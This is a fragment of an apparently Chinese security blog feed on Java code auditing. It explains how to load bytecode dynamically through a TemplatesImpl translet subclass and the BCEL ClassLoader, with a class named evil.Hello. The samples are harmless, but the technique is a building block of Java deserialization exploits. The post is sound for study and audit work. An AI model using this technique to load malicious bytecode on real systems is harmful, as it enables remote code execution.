class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> org.apache.xml.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> org.apache.xml.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplX</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] serializationHandlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplX</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;templateX construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240125200549193.png" alt="image-20240125200549193"></p><h2 id="BCEL加载字节码"><a href="#BCEL加载字节码" class="headerlink" title="BCEL加载字节码"></a>BCEL加载字节码</h2><p>通过BCEL提供的两个类 Repository 和 Utility 来利用： </p><p>Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码</p><p> Utility 用于将 原生的字节码转换成BCEL格式的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloBCEL</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(evil.Hello.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">System.out.println(code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BCEL ClassLoader加载字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(code).newInstance();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Java动态加载字节码TemplatesImpl和BCEL</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
